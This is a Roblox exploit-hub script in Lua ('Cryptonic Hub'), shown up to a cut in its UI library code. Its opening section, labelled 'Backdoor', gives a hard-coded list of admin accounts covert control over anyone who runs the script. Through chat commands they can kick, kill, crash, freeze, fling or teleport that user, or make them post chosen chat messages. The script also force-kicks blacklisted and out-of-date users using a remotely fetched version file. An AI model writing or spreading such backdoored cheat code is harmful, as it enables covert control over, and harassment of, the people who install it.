
if game.CoreGui:FindFirstChild("Loading") then return end

-- Backdoor:

local admin = {1570173214, 160135858, 263961430, 2312, 1891561339, 1737868527} --//martin, javi, diego(encodeed), demvkrao, misa, alt javi
local blacklist = {3033394550,2781863189,277499535,491817065,342920862,2052325419,1928021622} -- Blacklisted from script.
local prefix = "c!"
local version = "1.1.1"
local versionURL = "https://raw.githubusercontent.com/martinelcrac/cryptonichub/main/version"
local invite = "GYwdG34VFU"

local Loading = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Cryptonic = Instance.new("ImageLabel")
local UIGradient = Instance.new("UIGradient")
local Loading_2 = Instance.new("TextLabel")
local UIGradient_2 = Instance.new("UIGradient")

local isLoaded = false

Loading.Name = "Loading"
Loading.Parent = game.CoreGui
Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = Loading
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BackgroundTransparency = 1.000
Frame.Position = UDim2.new(0, 0, -0.100000001, 0)
Frame.Size = UDim2.new(1, 0, 1.10000002, 0)
Frame.ZIndex = 1000000300

Cryptonic.Name = "Cryptonic"
Cryptonic.Parent = Frame
Cryptonic.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Cryptonic.BackgroundTransparency = 1.000
Cryptonic.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
Cryptonic.Size = UDim2.new(0.400000006, 0, 0.400000006, 0)
Cryptonic.Image = "rbxassetid://8122641432"
Cryptonic.ImageTransparency = 1.000

UIGradient.Offset = Vector2.new(0, -1)
UIGradient.Rotation = 45
UIGradient.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0.00, 0.00), NumberSequenceKeypoint.new(0.12, 0.00), NumberSequenceKeypoint.new(0.28, 1.00), NumberSequenceKeypoint.new(1.00, 1.00)}
UIGradient.Parent = Cryptonic

Loading_2.Name = "Loading"
Loading_2.Parent = Frame
Loading_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Loading_2.BackgroundTransparency = 1.000
Loading_2.Position = UDim2.new(0.354000002, 0, 0.699999988, 0)
Loading_2.Size = UDim2.new(0.290548235, 0, 0.0431316197, 0)
Loading_2.Font = Enum.Font.SourceSansBold
Loading_2.Text = "made by martiin#0015, wmv#7622 and demvkrao#0069 <3"
Loading_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Loading_2.TextScaled = true
Loading_2.TextSize = 14.000
Loading_2.TextStrokeColor3 = Color3.fromRGB(255, 162, 0)
Loading_2.TextTransparency = 1.000
Loading_2.TextWrapped = true

UIGradient_2.Offset = Vector2.new(0, -5)
UIGradient_2.Rotation = 45
UIGradient_2.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0.00, 1.00), NumberSequenceKeypoint.new(0.09, 1.00), NumberSequenceKeypoint.new(0.27, 1.00), NumberSequenceKeypoint.new(1.00, 0.00)}
UIGradient_2.Parent = Frame



local db = true

game:GetService("TweenService"):Create(Cryptonic, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {ImageTransparency = 0}):Play()
game:GetService("TweenService"):Create(Frame, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {BackgroundTransparency = 0.5}):Play()
game:GetService("TweenService"):Create(Loading_2, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {TextTransparency = 0}):Play()

wait(1)
spawn(function()
	while wait() and Loading_2.TextTransparency == 0 do
		UIGradient.Rotation = 45
		UIGradient.Offset = Vector2.new(0, -1)
		game:GetService("TweenService"):Create(UIGradient, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {Offset = Vector2.new(0, 1.5)}):Play()
		wait(1)
		UIGradient.Offset = Vector2.new(0, -1.5)
		UIGradient.Rotation = -45
		game:GetService("TweenService"):Create(UIGradient, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {Offset = Vector2.new(0, 1.5)}):Play()
		wait(1);	
	end
end)

function doneFunc()
	game:GetService("TweenService"):Create(Cryptonic, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {Transparency = 1}):Play()
	game:GetService("TweenService"):Create(Loading_2, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {TextTransparency = 1}):Play()
	wait(1)
	game:GetService("TweenService"):Create(UIGradient_2, TweenInfo.new(1.3, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {Offset = Vector2.new(0, 1)}):Play()
end

wait(math.random(6,9))

doneFunc()
isLoaded = true

for _, v in pairs(game.Players:GetChildren()) do
	for i = 1, #blacklist do
		if v.UserId == blacklist[i] then
			game:GetService'Players'.LocalPlayer:Destroy()
			v:Kick("You are blacklisted from this script! you can appeal \nhttps://discord.gg/S6JbHb5FA9") -- You may set a custom message within the quotations
			while true do end
		end
	end
end

-->> hairattachment destroy 

pcall(function()
	game:GetService"Players".LocalPlayer.Character:WaitForChild("Head"):WaitForChild("HairAttachment"):Destroy()
end)
game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
	character:WaitForChild("Head"):FindFirstChild("HairAttachment"):Destroy()
end)

-- >> Aquí empieza todo :)

activePlrs = {}
whitelistPlrs = {}

function checkVersion()
	local onlineVersion = game:HttpGet(versionURL)
									   
	if not string.match(tostring(onlineVersion), version) then
		game:GetService'Players'.LocalPlayer:Kick("Script updated, please reexecute.") -- You may set a custom message within the quotations
		game:GetService'Players'.LocalPlayer:Destroy()
	end
end

checkVersion()

spawn(function()
	while wait(120) do
		checkVersion()
	end
end)


-- >> Backdoor.							<< --

local funciones = {}

function funciones.bring(plr, args)
	game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = plr.Character:FindFirstChild("HumanoidRootPart").CFrame
end

function funciones.loopbring(plr, args)
	loopBringSwitch = wait
	while loopBringSwitch() do
		game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = plr.Character:FindFirstChild("HumanoidRootPart").CFrame
	end
end

function funciones.sit(plr)
	game.Players.localPlayer.Character:FindFirstChildOfClass("Humanoid").Sit = true
end

function funciones.loopsit(plr)
	_G.loopsit = wait

while _G.loopsit() do
game.Players.localPlayer.Character:FindFirstChildOfClass("Humanoid").Sit = true
end
end

function funciones.noloopsit(plr)
	_G.loopsit = wait

while _G.loopsit() do
game.Players.localPlayer.Character:FindFirstChildOfClass("Humanoid").Sit = true
end
end

function funciones.jump(plr)

game.Players.localPlayer.Character:FindFirstChildOfClass("Humanoid").Jump = true

end

function funciones.loopjump(plr)

_G.loopsit = wait

while _G.loopsit() do
game.Players.localPlayer.Character:FindFirstChildOfClass("Humanoid").Jump = true
end
end

function funciones.noloopjump(plr)

_G.loopsit = false

while _G.loopsit() do
game.Players.localPlayer.Character:FindFirstChildOfClass("Humanoid").Jump = true
end
end

function funciones.rejoin(plr)
local ts = game:GetService("TeleportService")
local p = game:GetService("Players").LocalPlayer
ts:Teleport(game.PlaceId, p)
end

function funciones.volume(plr, args)
	local audiosito2 = game:GetService'Workspace':FindFirstChild('Sound')
	audiosito2.Volume = tostring(args) or .5
end

function funciones.music(plr, args)
	if game:GetService'Workspace':FindFirstChild('Sound') then
		local audiosito = game:GetService'Workspace':FindFirstChild('Sound')
		local audioID = tostring(args)

		audiosito.TimePosition = 0
		audiosito.SoundId = 'rbxassetid://'..audioID
		audiosito.Playing = true  
	else
		local audioID = tostring(args)
		local sound = Instance.new("Sound", workspace)
		sound.SoundId = 'rbxassetid://'..audioID
		sound.Playing = true  
	end
end

function funciones.unmusic(plr)
	game:GetService'Workspace':FindFirstChild('Sound'):Destroy()
end

function funciones.fling(plr)
	local FlingForce = Instance.new("BodyForce",game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart"))
	FlingForce.Force = Vector3.new(9e9, 9e9, 9e9)
end

function funciones.loopfling(plr)
_G.loopfling = true

while _G.loopfling do
wait()
	local FlingForce = Instance.new("BodyForce",game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart"))
FlingForce.Force = Vector3.new(9e9, 9e9, 9e9)
end
end

function funciones.noloopfling(plr)
_G.loopfling = false

while _G.loopfling do
wait()
	local FlingForce = Instance.new("BodyForce",game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart"))
FlingForce.Force = Vector3.new(9e9, 9e9, 9e9)
end
end


function funciones.noloopbring(plr, args)
	loopBringSwitch = false
end

function funciones.kick(plr, args)
	if args then
		reason = tostring(args)
	else
		reason = "Oops, seems like someone kicked you..."
	end

	game:GetService("Players").LocalPlayer:Kick(reason)
	game:GetService("Players").LocalPlayer:Destroy()
end

function funciones.kill(plr, args)
	game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
	game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid"):Destroy()
end

function funciones.loopkill(plr, args)
	loopKillSwitch = wait
	while loopKillSwitch() do
		wait(0.1)
		game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
		game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid"):Destroy()
	end
end

function funciones.noloopkill(plr, args)
	loopKillSwitch = false
end

function funciones.chat(plr, args)
	if string.match(string.lower(args), "gay") then
		string.gsub(args, "gay", "###")	
	end

	local msg = tostring(args)
	local destinatario = "All"
	local Evento = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
	Evento:FireServer(msg, destinatario)
end

function funciones.crash(plr, args)							   
	while true do end
	game:GetService("Players").LocalPlayer:Kick()
end

function funciones.flip(plr)
local plr = game.Players.LocalPlayer
plr.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,0, 3)
end

function funciones.ban(plr)

		game:GetService'Players'.LocalPlayer:Kick("USER BANNED") 
		game:GetService'Players'.LocalPlayer:Destroy()

end

function funciones.freeze(plr)
	frozen = true
	pcall(function()
		while frozen do
			wait()
			game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Anchored = true
		end
	end)
end

function funciones.rejoin(plr)
	local ts = game:GetService("TeleportService")
	local p = game:GetService("Players").LocalPlayer
	ts:Teleport(game.PlaceId, p)
end

function funciones.unfreeze(plr)
	frozen = false
	wait()
	game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Anchored = false
end


local function getPlayerByShortName(name)
	local shortName = string.lower(name)
	for _,plr in pairs(game.Players:GetChildren()) do
		local fullName = string.lower(plr.Name) -- lowercase here too
		if shortName == string.sub(fullName,1,string.len(shortName)) then
			return fullName
		end
	end
end

local function commands(msg, plr)
	if string.match(msg, prefix) then
		if string.match(msg, "/e ") then
			msg = string.gsub(msg, "/e ", "")	
		end
		local Split = string.split(msg, " ")
		local Command = Split[1]
		local Target = Split[2]
		local Args = string.gsub(msg, Command, "")
		local Args = string.gsub(Args, Target, "")


		if not table.find(admin, plr.UserId) and table.find(admin, game:GetService("Players").LocalPlayer.UserId) then		   
			return
		end

		-- Cambios al sistema, para poder pasar más argumentos.
		if getPlayerByShortName(tostring(Target)) == string.lower(game:GetService("Players").LocalPlayer.Name) or Target == "all" then
			Command = string.gsub(Command, prefix, "")
			funciones[Command](plr, Args)
		end
	end
end

-- Jugador q esta dentro.

spawn(function()
	for _,plr in ipairs(game:GetService("Players"):GetPlayers()) do
		if plr:GetRankInGroup(13346487) == 2 or table.find(admin, plr.UserId) then
			print("Player is in group and is premium")
			plr.Chatted:Connect(function(msg)
				commands(msg, plr)
			end)
		end
		wait()
	end
end)

-- Jugador q entra.

game:GetService("Players").PlayerAdded:Connect(function(plr)
	if plr:GetRankInGroup(13346487) == 2 or table.find(admin, plr.UserId) then
	    print("Player that joined is in group and is premium")
		plr.Chatted:Connect(function(msg)
			commands(msg, plr)
		end)
	end
end)

game:GetService("Players").PlayerRemoving:Connect(function(player)
	if table.find(activePlrs, player.Name) then
		table.remove(activePlrs, i)
		table.remove(whitelistPlrs, i)
	end
end)

-- jugador q esta dentro checker

function checkDisplay()
	for i,plr in pairs(game:GetService("Players"):GetPlayers()) do
		if plr:GetRankInGroup(13346487) == 2 then
			plr.Character:WaitForChild("Humanoid", 100).NameOcclusion=Enum.NameOcclusion.NoOcclusion
			plr.Character:WaitForChild("Humanoid", 100).DisplayName = "[" .. utf8.char(11088) .. "] "..plr.DisplayName
		elseif table.find(admin, plr.UserId) then
			if plr.UserId == 2312 then
            	plr.Character:WaitForChild("Humanoid", 100).NameOcclusion=Enum.NameOcclusion.NoOcclusion
				plr.Character:WaitForChild("Humanoid", 100).DisplayName = "[" .. utf8.char(128140) .. "] "..plr.DisplayName		
			else
				plr.Character:WaitForChild("Humanoid", 100).NameOcclusion = Enum.NameOcclusion.NoOcclusion
				plr.Character:WaitForChild("Humanoid", 100).DisplayName = "[" .. utf8.char(128081) .. "] "..plr.DisplayName
			end
		end
	end
end

spawn(function()
	while wait() do
		checkDisplay()
		for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
			if plr.Character:FindFirstChild("Humanoid") then
				if not plr.Character.Head:FindFirstChild("HairAttachment") and not table.find(activePlrs, plr.Name) and plr.Name ~= game:GetService("Players").LocalPlayer.Name  then
					table.insert(activePlrs, plr.Name)
				end
			end
		end
	end
end)

local function callback(text)
	if text == "Yes" then
	if getexploit() == "Synapse" then
	syn.request({
		Url = "http://127.0.0.1:6463/rpc?v=1",
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json",
			["Origin"] = "https://discord.com"
		},
		Body = game:GetService("HttpService"):JSONEncode({
			cmd = "INVITE_BROWSER",
			args = {
				code = invite
			},
			nonce = game:GetService("HttpService"):GenerateGUID(false)
		}),
	})
	else
	print("https://discord.gg/".. invite)
		setclipboard("https://discord.gg/".. invite)
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "CryptonicHub";
			Text = "Invite copied to your clipboard.";
			Duration = 4.5;
		})
end
	elseif text == "No" then
	end
end

local bindableFunction = Instance.new("BindableFunction")
bindableFunction.OnInvoke = callback

game.StarterGui:SetCore("SendNotification", {
	Title = "Cryptonic Hub"; -- Required. Has to be a string!
	Text = "Would you like to join our discord?"; -- Required. Has to be a string!
	Icon = "rbxassetid://8138484364"; -- Optional, defaults to "" (no icon)
	Duration = 5; -- Optional, defaults to 5 seconds
	Callback = bindableFunction; -- Optional, gets invoked with the text of the button the user pressed
	Button1 = "Yes"; -- Optional, makes a button appear with the given text that, when clicked, fires the Callback if it's given
	Button2 = "No"; -- Optional, makes another button appear with the given text that, when clicked, fires the Callback if it's given
})

local bindableFunction = Instance.new("BindableFunction")
bindableFunction.OnInvoke = callback

-- ***********************************************************************************************************
--
--
--
--
--              UI LIB
--
--
--
--
--
-- ***********************************************************************************************************

repeat wait() until isLoaded == true

function getLib()
	local lib = {RainbowColorValue = 0, HueSelectionPosition = 0}
	local UserInputService = game:GetService("UserInputService")
	local TweenService = game:GetService("TweenService")
	local RunService = game:GetService("RunService")
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local Mouse = LocalPlayer:GetMouse()
	local PresetColor = Color3.fromRGB(44, 120, 224)
	local CloseBind = Enum.KeyCode.P

	local ui = Instance.new("ScreenGui")
	ui.Name = "ui"
	ui.Parent = game.CoreGui
	ui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	coroutine.wrap(
		function()
			while wait() do
				lib.RainbowColorValue = lib.RainbowColorValue + 1 / 255
				lib.HueSelectionPosition = lib.HueSelectionPosition + 1

				if lib.RainbowColorValue >= 1 then
					lib.RainbowColorValue = 0
				end

				if lib.HueSelectionPosition == 80 then
					lib.HueSelectionPosition = 0
				end
			end
		end
	)()

	local function MakeDraggable(topbarobject, object)
		local Dragging = nil
		local DragInput = nil
		local DragStart = nil
		local StartPosition = nil

		local function Update(input)
			local Delta = input.Position - DragStart
			local pos =
				UDim2.new(
					StartPosition.X.Scale,
					StartPosition.X.Offset + Delta.X,
					StartPosition.Y.Scale,
					StartPosition.Y.Offset + Delta.Y
				)
			object.Position = pos
		end

		topbarobject.InputBegan:Connect(
			function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					Dragging = true
					DragStart = input.Position
					StartPosition = object.Position

					input.Changed:Connect(
						function()
							if input.UserInputState == Enum.UserInputState.End then
								Dragging = false
							end
						end
					)
				end
			end
		)

		topbarobject.InputChanged:Connect(
			function(input)
				if
					input.UserInputType == Enum.UserInputType.MouseMovement or
					input.UserInputType == Enum.UserInputType.Touch
				then
					DragInput = input
				end
			end
		)

		UserInputService.InputChanged:Connect(
			function(input)
				if input == DragInput and Dragging then
					Update(input)
				end
			end
		)
	end

	function lib:Window(text, preset, closebind)
		CloseBind = closebind or Enum.KeyCode.P
		PresetColor = preset or Color3.fromRGB(255, 85, 0)
		fs = false
		local Main = Instance.new("Frame")
		local TabHold = Instance.new("Frame")
		local TabHoldLayout = Instance.new("UIListLayout")
		local Title = Instance.new("TextLabel")
		local TabFolder = Instance.new("Folder")
		local DragFrame = Instance.new("Frame")

		Main.Name = "Main"
		Main.Parent = ui
		Main.AnchorPoint = Vector2.new(0.5, 0.5)
		Main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		Main.BorderSizePixel = 0
		Main.Position = UDim2.new(0.5, 0, 0.5, 0)
		Main.Size = UDim2.new(0, 0, 0, 0)
		Main.ClipsDescendants = true
		Main.Visible = true

		TabHold.Name = "TabHold"
		TabHold.Parent = Main
		TabHold.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TabHold.BackgroundTransparency = 1.000
		TabHold.Position = UDim2.new(0.0339285731, 0, 0.147335425, 0)
		TabHold.Size = UDim2.new(0, 107, 0, 254)

		TabHoldLayout.Name = "TabHoldLayout"
		TabHoldLayout.Parent = TabHold
		TabHoldLayout.SortOrder = Enum.SortOrder.LayoutOrder
		TabHoldLayout.Padding = UDim.new(0, 11)

		Title.Name = "Title"
		Title.Parent = Main
		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title.BackgroundTransparency = 1.000
		Title.Position = UDim2.new(0.0339285731, 0, 0.0564263314, 0)
		Title.Size = UDim2.new(0, 200, 0, 23)
		Title.Font = Enum.Font.GothamSemibold
		Title.Text = text
		Title.TextColor3 = PresetColor
		Title.TextSize = 16.000
		Title.TextXAlignment = Enum.TextXAlignment.Left

		DragFrame.Name = "DragFrame"
		DragFrame.Parent = Main
		DragFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		DragFrame.BackgroundTransparency = 1.000
		DragFrame.Size = UDim2.new(0, 560, 0, 41)

		Main:TweenSize(UDim2.new(0, 560, 0, 319), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)

		MakeDraggable(DragFrame, Main)

		coroutine.wrap(
			function()
				while wait() do
					Title.TextColor3 = PresetColor
				end
			end
		)()

		local uitoggled = false
		UserInputService.InputBegan:Connect(
			function(io, p)
			if p then return end
				if io.KeyCode == CloseBind then
					if uitoggled == false then
						Main:TweenSize(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
						uitoggled = true
					else
						Main:TweenSize(UDim2.new(0, 560, 0, 319),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true)
						uitoggled = false
					end
				end
			end
		)

		TabFolder.Name = "TabFolder"
		TabFolder.Parent = Main

		function lib:ChangePresetColor(toch)
			PresetColor = toch
		end

		function lib:Notification(texttitle, textdesc, textbtn)
			local NotificationHold = Instance.new("TextButton")
			local NotificationFrame = Instance.new("Frame")
			local OkayBtn = Instance.new("TextButton")
			local OkayBtnCorner = Instance.new("UICorner")
			local OkayBtnTitle = Instance.new("TextLabel")
			local NotificationTitle = Instance.new("TextLabel")
			local NotificationDesc = Instance.new("TextLabel")

			NotificationHold.Name = "NotificationHold"
			NotificationHold.Parent = Main
			NotificationHold.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			NotificationHold.BackgroundTransparency = 1.000
			NotificationHold.BorderSizePixel = 0
			NotificationHold.Size = UDim2.new(0, 560, 0, 319)
			NotificationHold.AutoButtonColor = false
			NotificationHold.Font = Enum.Font.SourceSans
			NotificationHold.Text = ""
			NotificationHold.TextColor3 = Color3.fromRGB(0, 0, 0)
			NotificationHold.TextSize = 14.000

			TweenService:Create(
				NotificationHold,
				TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{BackgroundTransparency = 0.7}
			):Play()
			wait(0.4)

			NotificationFrame.Name = "NotificationFrame"
			NotificationFrame.Parent = NotificationHold
			NotificationFrame.AnchorPoint = Vector2.new(0.5, 0.5)
			NotificationFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			NotificationFrame.BorderSizePixel = 0
			NotificationFrame.ClipsDescendants = true
			NotificationFrame.Position = UDim2.new(0.5, 0, 0.498432577, 0)

			NotificationFrame:TweenSize(
				UDim2.new(0, 164, 0, 193),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Quart,
				.6,
				true
			)

			OkayBtn.Name = "OkayBtn"
			OkayBtn.Parent = NotificationFrame
			OkayBtn.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
			OkayBtn.Position = UDim2.new(0.0609756112, 0, 0.720207274, 0)
			OkayBtn.Size = UDim2.new(0, 144, 0, 42)
			OkayBtn.AutoButtonColor = false
			OkayBtn.Font = Enum.Font.SourceSans
			OkayBtn.Text = ""
			OkayBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
			OkayBtn.TextSize = 14.000

			OkayBtnCorner.CornerRadius = UDim.new(0, 5)
			OkayBtnCorner.Name = "OkayBtnCorner"
			OkayBtnCorner.Parent = OkayBtn

			OkayBtnTitle.Name = "OkayBtnTitle"
			OkayBtnTitle.Parent = OkayBtn
			OkayBtnTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			OkayBtnTitle.BackgroundTransparency = 1.000
			OkayBtnTitle.Position = UDim2.new(0.0763888881, 0, 0, 0)
			OkayBtnTitle.Size = UDim2.new(0, 181, 0, 42)
			OkayBtnTitle.Font = Enum.Font.Gotham
			OkayBtnTitle.Text = textbtn
			OkayBtnTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
			OkayBtnTitle.TextSize = 14.000
			OkayBtnTitle.TextXAlignment = Enum.TextXAlignment.Left

			NotificationTitle.Name = "NotificationTitle"
			NotificationTitle.Parent = NotificationFrame
			NotificationTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			NotificationTitle.BackgroundTransparency = 1.000
			NotificationTitle.Position = UDim2.new(0.0670731738, 0, 0.0829015523, 0)
			NotificationTitle.Size = UDim2.new(0, 143, 0, 26)
			NotificationTitle.Font = Enum.Font.Gotham
			NotificationTitle.Text = texttitle
			NotificationTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
			NotificationTitle.TextSize = 18.000
			NotificationTitle.TextXAlignment = Enum.TextXAlignment.Left

			NotificationDesc.Name = "NotificationDesc"
			NotificationDesc.Parent = NotificationFrame
			NotificationDesc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			NotificationDesc.BackgroundTransparency = 1.000
			NotificationDesc.Position = UDim2.new(0.0670000017, 0, 0.218999997, 0)
			NotificationDesc.Size = UDim2.new(0, 143, 0, 91)
			NotificationDesc.Font = Enum.Font.Gotham
			NotificationDesc.Text = textdesc
			NotificationDesc.TextColor3 = Color3.fromRGB(255, 255, 255)
			NotificationDesc.TextSize = 15.000
			NotificationDesc.TextWrapped = true
			NotificationDesc.TextXAlignment = Enum.TextXAlignment.Left
			NotificationDesc.TextYAlignment = Enum.TextYAlignment.Top

			OkayBtn.MouseEnter:Connect(
				function()
					TweenService:Create(
						OkayBtn,
						TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
						{BackgroundColor3 = Color3.fromRGB(37, 37, 37)}
					):Play()
				end
			)

			OkayBtn.MouseLeave:Connect(
				function()
					TweenService:Create(
						OkayBtn,
						TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
						{BackgroundColor3 = Color3.fromRGB(34, 34, 34)}
					):Play()
				end
			)

			OkayBtn.MouseButton1Click:Connect(
				function()
					NotificationFrame:TweenSize(
						UDim2.new(0, 0, 0, 0),
						Enum.EasingDirection.Out,
						Enum.EasingStyle.Quart,
						.6,
						true
					)

					wait(0.4)

					TweenService:Create(
						NotificationHold,
						TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
						{BackgroundTransparency = 1}
					):Play()

					wait(.3)

					NotificationHold:Destroy()
				end
			)
		end
		local tabhold = {}
		function tabhold:Tab(text)
			local TabBtn = Instance.new("TextButton")
			local TabTitle = Instance.new("TextLabel")
			local TabBtnIndicator = Instance.new("Frame")
			local TabBtnIndicatorCorner = Instance.new("UICorner")

			TabBtn.Name = "TabBtn"
			TabBtn.Parent = TabHold
			TabBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TabBtn.BackgroundTransparency = 1.000
			TabBtn.Size = UDim2.new(0, 107, 0, 21)
			TabBtn.Font = Enum.Font.SourceSans
			TabBtn.Text = ""
			TabBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
			TabBtn.TextSize = 14.000

			TabTitle.Name = "TabTitle"
			TabTitle.Parent = TabBtn
			TabTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TabTitle.BackgroundTransparency = 1.000
			TabTitle.Size = UDim2.new(0, 107, 0, 21)
			TabTitle.Font = Enum.Font.Gotham
			TabTitle.Text = text
			TabTitle.TextColor3 = Color3.fromRGB(150, 150, 150)
			TabTitle.TextSize = 14.000
			TabTitle.TextXAlignment = Enum.TextXAlignment.Left

			TabBtnIndicator.Name = "TabBtnIndicator"
			TabBtnIndicator.Parent = TabBtn
			TabBtnIndicator.BackgroundColor3 = PresetColor
			TabBtnIndicator.BorderSizePixel = 0
			TabBtnIndicator.Position = UDim2.new(0, 0, 1, 0)
			TabBtnIndicator.Size = UDim2.new(0, 0, 0, 2)

			TabBtnIndicatorCorner.Name = "TabBtnIndicatorCorner"
			TabBtnIndicatorCorner.Parent = TabBtnIndicator

			coroutine.wrap(
				function()
					while wait() do
						TabBtnIndicator.BackgroundColor3 = PresetColor
					end
				end
			)()

			local Tab = Instance.new("ScrollingFrame")
			local TabLayout = Instance.new("UIListLayout")

			Tab.Name = "Tab"
			Tab.Parent = TabFolder
			Tab.Active = true
			Tab.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Tab.BackgroundTransparency = 1.000
			Tab.BorderSizePixel = 0
			Tab.Position = UDim2.new(0.31400001, 0, 0.147, 0)
			Tab.Size = UDim2.new(0, 373, 0, 254)
			Tab.CanvasSize = UDim2.new(0, 0, 0, 0)
			Tab.ScrollBarThickness = 3
			Tab.Visible = false

			TabLayout.Name = "TabLayout"
			TabLayout.Parent = Tab
			TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
			TabLayout.Padding = UDim.new(0, 6)

			if fs == false then
				fs = true
				TabBtnIndicator.Size = UDim2.new(0, 13, 0, 2)
				TabTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
				Tab.Visible = true
			end

			TabBtn.MouseButton1Click:Connect(
				function()
					for i, v in next, TabFolder:GetChildren() do
						if v.Name == "Tab" then
							v.Visible = false
						end
						Tab.Visible = true
					end
					for i, v in next, TabHold:GetChildren() do
						if v.Name == "TabBtn" then
							v.TabBtnIndicator:TweenSize(
								UDim2.new(0, 0, 0, 2),
								Enum.EasingDirection.Out,
								Enum.EasingStyle.Quart,
								.2,
								true
							)
							TabBtnIndicator:TweenSize(
								UDim2.new(0, 13, 0, 2),
								Enum.EasingDirection.Out,
								Enum.EasingStyle.Quart,
								.2,
								true
							)
							TweenService:Create(
								v.TabTitle,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{TextColor3 = Color3.fromRGB(150, 150, 150)}
							):Play()
							TweenService:Create(
								TabTitle,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{TextColor3 = Color3.fromRGB(255, 255, 255)}
							):Play()
						end
					end
				end
			)
			local tabcontent = {}
			function tabcontent:Button(text, callback)
				local Button = Instance.new("TextButton")
				local ButtonCorner = Instance.new("UICorner")
				local ButtonTitle = Instance.new("TextLabel")

				Button.Name = "Button"
				Button.Parent = Tab
				Button.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
				Button.Size = UDim2.new(0, 363, 0, 42)
				Button.AutoButtonColor = false
				Button.Font = Enum.Font.SourceSans
				Button.Text = ""
				Button.TextColor3 = Color3.fromRGB(0, 0, 0)
				Button.TextSize = 14.000

				ButtonCorner.CornerRadius = UDim.new(0, 5)
				ButtonCorner.Name = "ButtonCorner"
				ButtonCorner.Parent = Button

				ButtonTitle.Name = "ButtonTitle"
				ButtonTitle.Parent = Button
				ButtonTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				ButtonTitle.BackgroundTransparency = 1.000
				ButtonTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
				ButtonTitle.Size = UDim2.new(0, 187, 0, 42)
				ButtonTitle.Font = Enum.Font.Gotham
				ButtonTitle.Text = text
				ButtonTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
				ButtonTitle.TextSize = 14.000
				ButtonTitle.TextXAlignment = Enum.TextXAlignment.Left

				Button.MouseEnter:Connect(
					function()
						TweenService:Create(
							Button,
							TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
							{BackgroundColor3 = Color3.fromRGB(37, 37, 37)}
						):Play()
					end
				)

				Button.MouseLeave:Connect(
					function()
						TweenService:Create(
							Button,
